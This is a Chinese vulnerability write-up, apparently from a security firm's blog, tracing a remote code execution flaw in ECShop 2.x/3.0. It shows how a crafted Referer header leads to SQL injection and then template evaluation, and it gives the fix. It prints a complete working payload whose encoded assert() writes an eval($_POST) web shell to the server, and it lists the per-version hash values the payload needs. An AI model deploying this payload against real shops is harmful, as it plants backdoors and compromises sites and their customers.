\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[blog.riskivy.com\](https://blog.riskivy.com/ecshop-2-x-3-0%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/)

0x00 前言
-------

ECShop 是一款 B2C 独立网店系统，适合企业及个人快速构建个性化网上商店。2.x 版本跟 3.0 版本存在代码执行漏洞。

0x01 漏洞原理
---------

ECShop 没有对 $GLOBAL\[‘\_SERVER’\]\[‘HTTP\_REFERER’\] 变量进行验证，导致用户可以将任意代码插入的 user\_passport.dwt 模板中，随后 insert\_mod 根据模板内容动态执行相应的函数，用户插入恶意代码导致模板动态执行了 lib\_insert 下的 insert\_ads 方法，通过 SQL 注入，返回构造的执行代码，致使后面调用 cls\_template 模板类的 fetch 函数，成功执行恶意代码。

0x02 环境搭建
---------

**IDE** : PHPStorm  
**PHP**: 5.4  
[ECshop3.0](https://github.com/ec-shop/ecshop3.0.0906)  
[ECShop 2.7.3](https://github.com/shopex/ecshop)

0x03 分析过程
---------

### 整体功能

首先过一下整体的功能，进入到 user.php 中。  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-1.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-1.png)  
正常情况下，程序会将 $GLOBALS\[‘\_SERVER’\]\[‘HTTP\_REFERER’\] 赋值给了 $back\_act，接着通过 cls\_template 模板类的 assign 和 display 进行赋值和和传值给了 user\_passport.dwt 页面模板；这时候 user\_passport.dwt 页面模板的内容是这样子的。  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-2.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-2.png)

进入到 $smarty->display 中，通过 inser\_mod 的分割和反序列之后动态调用函数获得购物信息和会员信息，将会默认执行 user\_passport.dw 上面的两个函数，即 lib\_insert 函数类下的 insert\_cart\_info 和 insert\_member\_info 函数。

```
insert\_cart\_info函数//调用购物信息
insert\_member\_info函数 //调用会员信息


```

user\_passport.dw 模板:  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-3.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-3.png)  
inser\_mod 函数:  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-4.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-4.png)

### Payload

```
45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:280:"\*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7B24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A7A4975634768774A79776E50443977614841675A585A686243676B58314250553152624D5445784D5630704F79412F506963702729293B2F2F7D787878,10-- -";s:2:"id";s:3:"'/\*";}


```

### 开始分析

在 user.php 中的通过执行登陆操作的时候，将 $GLOBALS\[‘\_SERVER’\]\[‘HTTP\_REFERER’\] 的值修改为我们的代码  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-5.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-5.png)  
这时候 $back\_act 的值就是我们篡改之后的 REFERER 值了，之后程序会继续执行：

```
$smarty->assign('back\_act', $back\_act);  //赋值
$smarty->display('user\_passport.dwt'); //传值到模板上 


```

经过 assign，display 的赋值和传值之后，这时候 user\_passport.dwt 模板上的 back\_act 值是这样的：  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-6.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-6.png)  
在观察堆栈参数的时候，可以观察到 this->\_echash 的值跟我们的 Payload 的值是一样的，这是 ECSHOP 的固定的 HASH 值，2.7 版本的\_echash 值为 554fcae493e564ee0dc75bdf2ebf94ca 而 3.x 版本的\_echash 值为 45ea207d7a2b68c49582d2d22adf953，所以所用的 Payload 也不一样。  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-7.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-7.png)  
进入到 display 函数中，会执行 fetch 函数，获得页面模板内容；

```
$out = $this->fetch($filename, $cache\_id); //根据$cache\_id获取模板内容也就是user\_passport.dwt的内容


```

接着按照\_echash 的值也就是固定 hash 值进行分割；  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-8.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-8.png)  
分割完之后程序会先执行两个默认函数，然后才执行我们的代码，继续执行 insert\_mod 函数 。

```
$k\[$key\] = $this->insert\_mod($val);


```

跟进，可以看到我们输入的字符串根据`|`进行了分割，并分别赋值给了`$fun`和`$para`  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-9.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-9.png)  
所以最后的到的值类似于`$fun = insert_ads $para = array(‘num’=>”*/union…”,’id’=>”*/”)`  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-10.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-10.png)  
到了`return $fun($para);`这里，将会执行 lib\_insert 动态函数类下的 `insert_ads($para)`函数。  
跟进，可以看到这里执行了 SQL 语句，而`$arr[‘id’]`和`$arr[‘num’]`这两个参数正是我们传进来的数组中的内容，参数可控，从而导致了注入。  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-17.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-17.png)  
这时候在数据库中，执行的语句为：

```
SELECT a.ad\_id, a.position\_id, a.media\_type, a.ad\_link, a.ad\_code, a.ad\_name, p.ad\_width, p.ad\_height, p.position\_style, RAND() AS rnd FROM \`ecshop3\_0\`.\`ecs\_ad\` AS a LEFT JOIN \`ecshop3\_0\`.\`ecs\_ad\_position\` AS p ON a.position\_id = p.position\_id WHERE enabled = 1 AND start\_time <= '1536052713' AND end\_time >= '1536052713' AND a.position\_id = ''/\*' ORDER BY rnd LIMIT \*/ union select 1,0x272f2a,3,4,5,6,7,8,0x,0x272f2a,3,4,5,6,7,8,0x7B24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A7A4975634768774A79776E50443977614841675A585A686243676B58314250553152624D5445784D5630704F79412F506963702729293B2F2F7D787878,10-- -


```

[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-11.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-11.png)

可以看到数据库的 position\_id 和 position\_style 字段分别被 union select 查询覆盖为了`'/*`和`{$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzIucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTExMV0pOyA/Picp'));//}xxx`  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-12.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-12.png)  
查询结束之后, 根据 $position\_style 的值执行了 cls\_template 模板类的 fetch 函数。

```
$val = $GLOBALS\[‘smarty’\]->fetch($position\_style); //执行了smarty的fetch函数


```

跟进，看到这里，这里最终执行了恶意代码。

```
$out = $this->\_eval($this->fetch\_str(substr($filename, 4))); //最终执行了语句


```

看一下内部的字符串处理，传入 filename 的值为：

```
” str:{$asd’\];assert(base64\_decode(‘ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp’));//}xxx”


```

然后使用 substr 对 filenname 进行切割，接着进入到 $this->fetch\_str 中，可以看到 fetch\_str 函数的返回内容为`<?php echo xx>`格式的。  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-13.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-13.png)  
在跟入到 $this->get\_val 中，执行了`$p = $this->make_var($val);`，跟入到 make\_var 函数中。  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-14.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-14.png)  
字符串处理最后返回的值为：

```
$this->\_var\['asd'\];assert(base64\_decode('ZmlsZV9wdXRfY29udGVudHMoJzIucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTExMV0pOyA/Picp'));//'\] 


```

拼接在一起，最后返回的数据为：

```
<?php echo $this->\_var\['asd'\];assert(base64\_decode('ZmlsZV9wdXRfY29udGVudHMoJzIucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTExMV0pOyA/Picp'));//>


```

从而最终导致了代码执行。  
[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-15.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-15.png)

0x04 代码执行的调用链
-------------

[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-16.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-16.png)

0x05 修复方案
---------

在 ECShop3.6 版本中 insert\_ads 函数对 $arr\[‘num’\] 和 $arr\[‘id’\] 进行了强制类型转换。

```
$arr\[‘num’\] = intval($arr\[‘num’\]);
$arr\['id'\] = intval($arr\['id'\]);


```

作者：斗象能力中心 TCC-t-bag